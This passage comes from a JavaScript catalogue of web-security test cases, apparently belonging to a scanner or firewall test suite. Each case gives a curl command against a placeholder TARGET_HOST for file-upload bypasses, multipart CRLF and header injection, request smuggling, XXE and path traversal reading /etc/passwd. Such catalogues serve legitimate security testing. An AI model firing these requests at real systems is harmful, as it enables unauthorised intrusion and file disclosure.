                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name"file"\\r\\n\\r\\ndata\\r\\n------Test--\' -v'
                        }
                    ]
                },
                {
                    id: 'MULTIPART-005',
                    name: 'Missing Content-Disposition Terminator',
                    severity: 'medium',
                    description: 'Tests missing terminators in multipart',
                    scenarios: [
                        {
                            id: 'MULTIPART-005-A',
                            name: 'No Final Boundary',
                            description: 'Missing final boundary',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"\\r\\n\\r\\ndata\' -v'
                        },
                        {
                            id: 'MULTIPART-005-B',
                            name: 'No Double Dash',
                            description: 'Missing -- at end',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"\\r\\n\\r\\ndata\\r\\n------Test\' -v'
                        },
                        {
                            id: 'MULTIPART-005-C',
                            name: 'Incomplete Boundary',
                            description: 'Truncated boundary',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"\\r\\n\\r\\ndata\\r\\n----\' -v'
                        }
                    ]
                },
                {
                    id: 'MULTIPART-006',
                    name: 'Allow File Name Failure in MultiPart',
                    severity: 'high',
                    description: 'Tests problematic filenames in multipart',
                    scenarios: [
                        {
                            id: 'MULTIPART-006-A',
                            name: 'Path Traversal Filename',
                            description: 'Directory traversal in filename',
                            curl: 'echo "test" | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;filename=../../evil.php" -v'
                        },
                        {
                            id: 'MULTIPART-006-B',
                            name: 'Null Byte Filename',
                            description: 'Null byte in filename',
                            curl: 'echo "test" | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;filename=test.php%00.jpg" -v'
                        },
                        {
                            id: 'MULTIPART-006-C',
                            name: 'Unicode Filename',
                            description: 'Unicode tricks in filename',
                            curl: 'echo "test" | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;filename=test%E2%80%8Cphp.jpg" -v'
                        }
                    ]
                },
                {
                    id: 'MULTIPART-007',
                    name: 'Allow Improper Boundary Header',
                    severity: 'medium',
                    description: 'Tests improper boundary specifications',
                    scenarios: [
                        {
                            id: 'MULTIPART-007-A',
                            name: 'No Boundary',
                            description: 'Missing boundary parameter',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"\\r\\n\\r\\ndata\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-007-B',
                            name: 'Empty Boundary',
                            description: 'Empty boundary value',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=" -d "data" -v'
                        },
                        {
                            id: 'MULTIPART-007-C',
                            name: 'Special Chars Boundary',
                            description: 'Special characters in boundary',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=--<>--" --data-binary $\'--<>--\\r\\nContent-Disposition: form-data; name="file"\\r\\n\\r\\ndata\\r\\n--<>----\' -v'
                        }
                    ]
                },
                {
                    id: 'MULTIPART-008',
                    name: 'Allow Improper Boundary Value',
                    severity: 'medium',
                    description: 'Tests invalid boundary values in multipart',
                    scenarios: [
                        {
                            id: 'MULTIPART-008-A',
                            name: 'Mismatched Boundary',
                            description: 'Different boundary in content',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=AAA" --data-binary $\'------BBB\\r\\nContent-Disposition: form-data; name="file"\\r\\n\\r\\ndata\\r\\n------BBB--\' -v'
                        },
                        {
                            id: 'MULTIPART-008-B',
                            name: 'Long Boundary',
                            description: 'Extremely long boundary',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" -d "data" -v'
                        },
                        {
                            id: 'MULTIPART-008-C',
                            name: 'Binary Boundary',
                            description: 'Binary data in boundary',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=%00%01%02" -d "data" -v'
                        }
                    ]
                },
                {
                    id: 'BODY-001',
                    name: 'Allow GET Request with Body',
                    severity: 'medium',
                    description: 'Tests GET requests containing body data',
                    scenarios: [
                        {
                            id: 'BODY-001-A',
                            name: 'GET with JSON Body',
                            description: 'GET request with JSON payload',
                            curl: 'curl -X GET "http://TARGET_HOST/api" -H "Content-Type: application/json" -d \'{"unexpected":"body"}\' -v'
                        },
                        {
                            id: 'BODY-001-B',
                            name: 'GET with Form Data',
                            description: 'GET request with form data',
                            curl: 'curl -X GET "http://TARGET_HOST/api" -H "Content-Type: application/x-www-form-urlencoded" -d "user=admin&pass=secret" -v'
                        },
                        {
                            id: 'BODY-001-C',
                            name: 'GET with File Upload',
                            description: 'GET request with multipart',
                            curl: 'echo "test" | curl -X GET "http://TARGET_HOST/api" -F "file=@-" -v'
                        }
                    ]
                },
                {
                    id: 'UPLOAD-003',
                    name: 'Content-Type Manipulation in File Uploads',
                    severity: 'critical',
                    description: 'Tests manipulation of Content-Type for file uploads',
                    scenarios: [
                        {
                            id: 'UPLOAD-003-A',
                            name: 'Double Content-Type',
                            description: 'Multiple Content-Type headers',
                            curl: 'echo \'<?php echo "test"; ?>\' | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;type=image/jpeg" -H "Content-Type: multipart/form-data; boundary=--boundary" --data-binary $\'----boundary\\r\\nContent-Disposition: form-data; name="file"; filename="image.jpg"\\r\\nContent-Type: image/jpeg\\r\\nContent-Type: application/x-php\\r\\n\\r\\n<?php echo "test"; ?>\\r\\n----boundary--\' -v'
                        },
                        {
                            id: 'UPLOAD-003-B',
                            name: 'Nested Content-Type',
                            description: 'Nested Content-Type parameter',
                            curl: 'echo \'<?php echo "test"; ?>\' | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;type=image/jpeg;application/x-php" -v'
                        },
                        {
                            id: 'UPLOAD-003-C',
                            name: 'Mismatched Content-Types',
                            description: 'Different types in header and payload',
                            curl: 'echo \'<?php echo "test"; ?>\' | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;type=image/jpeg" -H "X-Content-Type: application/x-php" -v'
                        }
                    ]
                },
                {
                    id: 'UPLOAD-004',
                    name: 'MIME Type Bypass Techniques',
                    severity: 'high',
                    description: 'Tests bypassing MIME type restrictions',
                    scenarios: [
                        {
                            id: 'UPLOAD-004-A',
                            name: 'Case Sensitivity Bypass',
                            description: 'Using case variations in MIME type',
                            curl: 'echo \'<?php echo "test"; ?>\' | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;type=ImAgE/JpEg" -v'
                        },
                        {
                            id: 'UPLOAD-004-B',
                            name: 'Spaces in MIME Type',
                            description: 'Adding spaces to MIME type',
                            curl: 'echo \'<?php echo "test"; ?>\' | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;type=image/jpeg " -v'
                        },
                        {
                            id: 'UPLOAD-004-C',
                            name: 'Custom MIME Type',
                            description: 'Using custom/rare MIME type',
                            curl: 'echo \'<?php echo "test"; ?>\' | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;type=image/x-jpg" -v'
                        }
                    ]
                },
                {
                    id: 'UPLOAD-005',
                    name: 'Nested Files in Multipart',
                    severity: 'critical',
                    description: 'Tests nested file uploads in multipart',
                    scenarios: [
                        {
                            id: 'UPLOAD-005-A',
                            name: 'Basic Nested File',
                            description: 'Simple nested file in form',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=outer" --data-binary $\'--outer\\r\\nContent-Disposition: form-data; name="profile"\\r\\nContent-Type: multipart/form-data; boundary=inner\\r\\n\\r\\n--inner\\r\\nContent-Disposition: form-data; name="file"; filename="evil.php"\\r\\n\\r\\n<?php echo "test"; ?>\\r\\n--inner--\\r\\n--outer--\' -v'
                        },
                        {
                            id: 'UPLOAD-005-B',
                            name: 'Deeply Nested Files',
                            description: 'Multiple levels of nesting',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=level1" --data-binary $\'--level1\\r\\nContent-Disposition: form-data; name="data"\\r\\nContent-Type: multipart/form-data; boundary=level2\\r\\n\\r\\n--level2\\r\\nContent-Disposition: form-data; name="file"\\r\\nContent-Type: multipart/form-data; boundary=level3\\r\\n\\r\\n--level3\\r\\nContent-Disposition: form-data; name="file"; filename="evil.php"\\r\\n\\r\\n<?php echo "test"; ?>\\r\\n--level3--\\r\\n--level2--\\r\\n--level1--\' -v'
                        },
                        {
                            id: 'UPLOAD-005-C',
                            name: 'Sibling Nested Files',
                            description: 'Multiple nested files at same level',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=outer" --data-binary $\'--outer\\r\\nContent-Disposition: form-data; name="profile"\\r\\nContent-Type: multipart/form-data; boundary=inner\\r\\n\\r\\n--inner\\r\\nContent-Disposition: form-data; name="file1"; filename="normal.jpg"\\r\\n\\r\\nJFIF\\r\\n--inner\\r\\nContent-Disposition: form-data; name="file2"; filename="evil.php"\\r\\n\\r\\n<?php echo "test"; ?>\\r\\n--inner--\\r\\n--outer--\' -v'
                        }
                    ]
                },
                {
                    id: 'UPLOAD-006',
                    name: 'Metadata Exploitation in Uploads',
                    severity: 'high',
                    description: 'Tests exploiting metadata in uploaded files',
                    scenarios: [
                        {
                            id: 'UPLOAD-006-A',
                            name: 'EXIF Comment Injection',
                            description: 'Malicious EXIF comment',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@<(echo -e \'\\xff\\xd8\\xff\\xe1\\x00\\x00EXIF\\x00\\x00<?php echo \"test\"; ?>\')" -v'
                        },
                        {
                            id: 'UPLOAD-006-B',
                            name: 'SVG XML Injection',
                            description: 'XML code in SVG file',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@<(echo \'<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\"><script>alert(1)< /script></svg>\')" -v'
                        },
                        {
                            id: 'UPLOAD-006-C',
                            name: 'PDF JavaScript Injection',
                            description: 'JavaScript in PDF metadata',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@<(echo -e \'%PDF-1.3\\n%\\xbf\\xf7\\xa2\\xfe\\n1 0 obj\\n<<\\n/Type /Catalog\\n/Pages 2 0 R\\n/OpenAction 5 0 R\\n>>\\nendobj\\n2 0 obj\\n<<\\n/Type /Pages\\n/Count 1\\n/Kids [3 0 R]\\n>>\\nendobj\\n3 0 obj\\n<<\\n/Type /Page\\n/Parent 2 0 R\\n/Resources <<\\n/Font <<\\n/F1 4 0 R\\n>>\\n>>\\n/MediaBox [0 0 612 792]\\n>>\\nendobj\\n4 0 obj\\n<<\\n/Type /Font\\n/Subtype /Type1\\n/BaseFont /Helvetica\\n>>\\nendobj\\n5 0 obj\\n<<\\n/Type /Action\\n/S /JavaScript\\n/JS (app.alert(1);)\\n>>\\nendobj\\nxref\\n0 6\\n0000000000 65535 f\\n0000000009 00000 n\\n0000000074 00000 n\\n0000000120 00000 n\\n0000000223 00000 n\\n0000000291 00000 n\\ntrailer\\n<<\\n/Size 6\\n/Root 1 0 R\\n>>\\nstartxref\\n354\\n%%EOF\')" -v'
                        }
                    ]
                },
                {
                    id: 'UPLOAD-007',
                    name: 'Polyglot File Uploads',
                    severity: 'critical',
                    description: 'Tests uploading polyglot files (valid in multiple formats)',
                    scenarios: [
                        {
                            id: 'UPLOAD-007-A',
                            name: 'PHP-GIF Polyglot',
                            description: 'File valid as both GIF and PHP',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@<(echo -e \'GIF89a;\\n<?php echo \"test\"; ?>\')" -v'
                        },
                        {
                            id: 'UPLOAD-007-B',
                            name: 'JavaScript-JPG Polyglot',
                            description: 'File valid as both JPG and JS',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@<(echo -e \'\\xff\\xd8\\xff\\xe0\\x00\\x10JFIF\\x00\\x01\\x01\\x01\\x00H\\x00H\\x00\\x00\\xff\\xfe\\x00\\x13//<script>alert(1)//\' > test.jpg)" -v'
                        },
                        {
                            id: 'UPLOAD-007-C',
                            name: 'HTML-ZIP Polyglot',
                            description: 'File valid as both ZIP and HTML',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@<(echo -e \'<!DOCTYPE html>\\n<html>\\n<body>\\n<script>alert(1)< /script>\\n</body>\\n</html>\\n\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\')" -v'
                        }
                    ]
                },
                {
                    id: 'UPLOAD-008',
                    name: 'File Signature Manipulation',
                    severity: 'high',
                    description: 'Tests manipulation of file signatures (magic bytes)',
                    scenarios: [
                        {
                            id: 'UPLOAD-008-A',
                            name: 'Prepended Signature',
                            description: 'Adding signature to malicious file',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@<(echo -e \'\\xff\\xd8\\xff\\xe0<?php echo \"test\"; ?>\')" -v'
                        },
                        {
                            id: 'UPLOAD-008-B',
                            name: 'Dual Signature',
                            description: 'Adding multiple signatures',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@<(echo -e \'\\x47\\x49\\x46\\x38\\x39\\x61\\xff\\xd8\\xff\\xe0<?php echo \"test\"; ?>\')" -v'
                        },
                        {
                            id: 'UPLOAD-008-C',
                            name: 'Corrupted Signature',
                            description: 'Partially valid signature',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@<(echo -e \'\\xff\\xd8\\xff\\xe1<?php echo \"test\"; ?>\')" -v'
                        }
                    ]
                },
                {
                    id: 'UPLOAD-009',
                    name: 'Race Conditions in File Uploads',
                    severity: 'critical',
                    description: 'Tests exploiting race conditions in upload processing',
                    scenarios: [
                        {
                            id: 'UPLOAD-009-A',
                            name: 'Quick Deletion After Upload',
                            description: 'Execute file before validation completes',
                            curl: '(curl -X POST "http://TARGET_HOST/upload" -F "file=@<(echo \'<?php echo \"test\"; ?>\')" -o /dev/null -s & curl "http://TARGET_HOST/uploads/$(date +%s).php" -s)'
                        },
                        {
                            id: 'UPLOAD-009-B',
                            name: 'Parallel Uploads',
                            description: 'Multiple uploads in parallel',
                            curl: 'for i in {1..10}; do curl -X POST "http://TARGET_HOST/upload" -F "file=@<(echo \'<?php echo \"test\"; ?>\')" -o /dev/null -s & done'
                        },
                        {
                            id: 'UPLOAD-009-C',
                            name: 'Deferred Upload Processing',
                            description: 'Large file upload with concurrent access',
                            curl: '(curl -X POST "http://TARGET_HOST/upload" -F "file=@<(cat <(echo \'<?php echo \"test\"; ?>\') <(head -c 10485760 /dev/zero))" --limit-rate 1k -o /dev/null -s & sleep 1 && curl "http://TARGET_HOST/uploads/$(date +%s).php" -s)'
                        }
                    ]
                },
                {
                    id: 'UPLOAD-010',
                    name: 'Content-Length Manipulation',
                    severity: 'high',
                    description: 'Tests manipulating Content-Length in file uploads',
                    scenarios: [
                        {
                            id: 'UPLOAD-010-A',
                            name: 'Incorrect Content-Length',
                            description: 'Wrong Content-Length header',
                            curl: 'echo "test" | curl -X POST "http://TARGET_HOST/upload" -H "Content-Length: 100" -F "file=@-" -v'
                        },
                        {
                            id: 'UPLOAD-010-B',
                            name: 'Multiple Content-Length',
                            description: 'Multiple Content-Length headers',
                            curl: 'echo "test" | curl -X POST "http://TARGET_HOST/upload" -H "Content-Length: 4" -H "Content-Length: 400" -F "file=@-" -v'
                        },
                        {
                            id: 'UPLOAD-010-C',
                            name: 'Zero Content-Length',
                            description: 'Zero Content-Length with data',
                            curl: 'echo "test" | curl -X POST "http://TARGET_HOST/upload" -H "Content-Length: 0" -H "X-Content-Length: 4" -F "file=@-" -v'
                        }
                    ]
                },
                {
                    id: 'UPLOAD-011',
                    name: 'Multiple Filename Variations',
                    severity: 'high',
                    description: 'Tests filename variations in uploads',
                    scenarios: [
                        {
                            id: 'UPLOAD-011-A',
                            name: 'Multiple Extensions',
                            description: 'File with multiple extensions',
                            curl: 'echo "test" | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;filename=test.php.jpg" -v'
                        },
                        {
                            id: 'UPLOAD-011-B',
                            name: 'Special Character Extensions',
                            description: 'Special characters in extension',
                            curl: 'echo "test" | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;filename=test.ph?p" -v'
                        },
                        {
                            id: 'UPLOAD-011-C',
                            name: 'Uppercase Extensions',
                            description: 'Mixed case in extensions',
                            curl: 'echo "test" | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;filename=test.pHp" -v'
                        }
                    ]
                },
                {
                    id: 'MULTIPART-009',
                    name: 'CRLF Injection in Multipart',
                    severity: 'critical',
                    description: 'Tests CRLF injection in multipart data',
                    scenarios: [
                        {
                            id: 'MULTIPART-009-A',
                            name: 'Basic CRLF Injection',
                            description: 'Simple CRLF in form data',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"; filename="test.jpg"\\r\\n\\r\\ndata\\r\\n------Test\\r\\nContent-Disposition: form-data; name="description"\\r\\n\\r\\ntest\\r\\n%0d%0aContent-Disposition: form-data; name="hidden"; filename="evil.php"\\r\\n\\r\\n<?php echo "test"; ?>\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-009-B',
                            name: 'CRLF in Filename',
                            description: 'CRLF injection in filename',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"; filename="test.jpg\\r\\nContent-Type: application/x-php\\r\\n\\r\\n<?php echo \\"test\\"; ?>"\\r\\n\\r\\ndata\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-009-C',
                            name: 'CRLF in Boundary',
                            description: 'CRLF in boundary value',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test\\r\\nContent-Disposition: form-data; name=\\"inject\\"" -d "test" -v'
                        }
                    ]
                },
                {
                    id: 'MULTIPART-010',
                    name: 'Header Injection in Multipart',
                    severity: 'critical',
                    description: 'Tests header injection in multipart data',
                    scenarios: [
                        {
                            id: 'MULTIPART-010-A',
                            name: 'Content-Type Injection',
                            description: 'Injecting additional Content-Type',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"; filename="test.jpg"\\r\\nContent-Type: image/jpeg\\r\\nX-Content-Type: application/x-php\\r\\n\\r\\n<?php echo "test"; ?>\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-010-B',
                            name: 'Cookie Injection',
                            description: 'Injecting Cookie header',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"; filename="test.jpg"\\r\\nCookie: session=1234567890\\r\\n\\r\\ndata\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-010-C',
                            name: 'Host Header Injection',
                            description: 'Injecting Host header',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"; filename="test.jpg"\\r\\nHost: evil.com\\r\\n\\r\\ndata\\r\\n------Test--\' -v'
                        }
                    ]
                },
                {
                    id: 'UPLOAD-012',
                    name: 'Content-Encoding Exploits',
                    severity: 'high',
                    description: 'Tests Content-Encoding manipulation in uploads',
                    scenarios: [
                        {
                            id: 'UPLOAD-012-A',
                            name: 'Gzip Encoded Payload',
                            description: 'Gzip encoded malicious file',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@<(echo \'<?php echo \"test\"; ?>\' | gzip)" -H "Content-Encoding: gzip" -v'
                        },
                        {
                            id: 'UPLOAD-012-B',
                            name: 'Deflate Encoded Payload',
                            description: 'Deflate encoded malicious file',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@<(echo \'<?php echo \"test\"; ?>\' | zlib-flate -compress)" -H "Content-Encoding: deflate" -v'
                        },
                        {
                            id: 'UPLOAD-012-C',
                            name: 'Multiple Encodings',
                            description: 'Multiple layers of encoding',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -F "file=@<(echo \'<?php echo \"test\"; ?>\' | gzip | base64)" -H "Content-Encoding: gzip, base64" -v'
                        }
                    ]
                },
                {
                    id: 'MULTIPART-011',
                    name: 'Multipart Structure Manipulations',
                    severity: 'high',
                    description: 'Tests manipulating multipart structure',
                    scenarios: [
                        {
                            id: 'MULTIPART-011-A',
                            name: 'Nested Boundaries',
                            description: 'Nesting boundaries within each other',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=outer" --data-binary $\'--outer\\r\\nContent-Disposition: form-data; name="file"\\r\\n\\r\\n--outer\\r\\nContent-Disposition: form-data; name="evil"; filename="evil.php"\\r\\n\\r\\n<?php echo "test"; ?>\\r\\n--outer--\\r\\n--outer--\' -v'
                        },
                        {
                            id: 'MULTIPART-011-B',
                            name: 'Partial Boundary Match',
                            description: 'Using partial boundary matches',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"; filename="test.jpg"\\r\\n\\r\\ndata----Test\\r\\nContent-Disposition: form-data; name="evil"; filename="evil.php"\\r\\n\\r\\n<?php echo "test"; ?>\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-011-C',
                            name: 'Unbalanced Structure',
                            description: 'Missing start/end boundaries',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'Content-Disposition: form-data; name="file"; filename="test.jpg"\\r\\n\\r\\ndata\\r\\n------Test--\' -v'
                        }
                    ]
                },
                {
                    id: 'UPLOAD-013',
                    name: 'Mixed Content Types',
                    severity: 'high',
                    description: 'Tests mixed content types in uploads',
                    scenarios: [
                        {
                            id: 'UPLOAD-013-A',
                            name: 'Mixed Multipart/JSON',
                            description: 'Mixing multipart and JSON data',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="data"\\r\\nContent-Type: application/json\\r\\n\\r\\n{"file": "<?php echo \\"test\\"; ?>"}\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'UPLOAD-013-B',
                            name: 'XML in Multipart',
                            description: 'XML data in multipart section',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="data"\\r\\nContent-Type: application/xml\\r\\n\\r\\n<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'UPLOAD-013-C',
                            name: 'Multipart in URL Parameters',
                            description: 'Multipart data in URL parameters',
                            curl: 'curl "http://TARGET_HOST/upload?data=%2D%2D%2D%2D%2DTest%0D%0AContent%2DDisposition%3A%20form%2Ddata%3B%20name%3D%22file%22%3B%20filename%3D%22evil%2Ephp%22%0D%0A%0D%0A%3C%3Fphp%20echo%20%22test%22%3B%20%3F%3E%0D%0A%2D%2D%2D%2D%2DTest%2D%2D" -v'
                        }
                    ]
                },
                {
                    id: 'UPLOAD-014',
                    name: 'Extension Handling Bypasses',
                    severity: 'critical',
                    description: 'Tests bypassing extension restrictions',
                    scenarios: [
                        {
                            id: 'UPLOAD-014-A',
                            name: 'Double Extension',
                            description: 'Using double extensions',
                            curl: 'echo "<?php echo \"test\"; ?>" | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;filename=test.php.jpg" -v'
                        },
                        {
                            id: 'UPLOAD-014-B',
                            name: 'Trailing Dots',
                            description: 'Using trailing dots in filename',
                            curl: 'echo "<?php echo \"test\"; ?>" | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;filename=test.php." -v'
                        },
                        {
                            id: 'UPLOAD-014-C',
                            name: 'Alternate PHP Extensions',
                            description: 'Using less common PHP extensions',
                            curl: 'echo "<?php echo \"test\"; ?>" | curl -X POST "http://TARGET_HOST/upload" -F "file=@-;filename=test.phtml" -v'
                        }
                    ]
                },
                {
                    id: 'UPLOAD-015',
                    name: 'Content-Disposition Manipulation',
                    severity: 'high',
                    description: 'Tests manipulating Content-Disposition header',
                    scenarios: [
                        {
                            id: 'UPLOAD-015-A',
                            name: 'Quoted Path Traversal',
                            description: 'Path traversal in quoted filename',
                            curl: 'echo "test" | curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"; filename="..\\\\..\\\\evil.php"\\r\\n\\r\\n<?php echo "test"; ?>\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'UPLOAD-015-B',
                            name: 'Mixed Disposition Types',
                            description: 'Mixing disposition types',
                            curl: 'echo "test" | curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: attachment; form-data; name="file"; filename="evil.php"\\r\\n\\r\\n<?php echo "test"; ?>\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'UPLOAD-015-C',
                            name: 'Encoded Characters in Disposition',
                            description: 'URL-encoded characters in disposition',
                            curl: 'echo "test" | curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"; filename="%2e%2e%2f%65%76%69%6c%2e%70%68%70"\\r\\n\\r\\n<?php echo "test"; ?>\\r\\n------Test--\' -v'
                        }
                    ]
                },
                {
                    id: 'MULTIPART-012',
                    name: 'HTTP Request Smuggling via Multipart',
                    severity: 'critical',
                    description: 'Tests HTTP request smuggling via multipart',
                    scenarios: [
                        {
                            id: 'MULTIPART-012-A',
                            name: 'Basic Request Smuggling',
                            description: 'Basic HTTP request smuggling',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"; filename="test.txt"\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: TARGET_HOST\\r\\n\\r\\n\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-012-B',
                            name: 'POST Request Smuggling',
                            description: 'Smuggling POST request',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"; filename="test.txt"\\r\\n\\r\\nPOST /api/admin HTTP/1.1\\r\\nHost: TARGET_HOST\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 14\\r\\n\\r\\naction=delete\\r\\n\\r\\n------Test--\' -v'
                        },
                        {
                            id: 'MULTIPART-012-C',
                            name: 'Transfer-Encoding Smuggling',
                            description: 'Using Transfer-Encoding for smuggling',
                            curl: 'curl -X POST "http://TARGET_HOST/upload" -H "Content-Type: multipart/form-data; boundary=----Test" -H "Transfer-Encoding: chunked" --data-binary $\'------Test\\r\\nContent-Disposition: form-data; name="file"; filename="test.txt"\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: TARGET_HOST\\r\\n\\r\\n\\r\\n------Test--\' -v'
                        }
                    ]
                }
            ],
           'Directory Brute Force and Discovery': [
                {
                    id: 'DIR-001',
                    name: 'Basic Directory Traversal',
                    severity: 'critical',
                    description: 'Tests basic directory traversal patterns',
                    scenarios: [
                        {
                            id: 'DIR-001-A',
                            name: 'Simple Traversal',
                            description: 'Basic ../ pattern',
                            curl: 'curl "http://TARGET_HOST/../../etc/passwd" -v'
                        },
                        {
                            id: 'DIR-001-B',
                            name: 'Deep Traversal',
                            description: 'Multiple directory levels',
                            curl: 'curl "http://TARGET_HOST/../../../../../../../../../etc/passwd" -v'
                        },
                        {
                            id: 'DIR-001-C',
                            name: 'Encoded Traversal',
                            description: 'URL encoded traversal',
                            curl: 'curl "http://TARGET_HOST/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" -v'
                        }
                    ]
                },
                {
                    id: 'DIR-002',
                    name: 'Advanced Directory Traversal',
                    severity: 'critical',
                    description: 'Advanced directory traversal techniques',
                    scenarios: [
                        {
                            id: 'DIR-002-A',
                            name: 'Double Encoding',
                            description: 'Double URL encoding',
                            curl: 'curl "http://TARGET_HOST/%252e%252e%252f%252e%252e%252fetc%252fpasswd" -v'
                        },
                        {
                            id: 'DIR-002-B',
                            name: 'Unicode Encoding',
                            description: 'Unicode encoding bypass',
                            curl: 'curl "http://TARGET_HOST/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd" -v'
                        },
                        {
                            id: 'DIR-002-C',
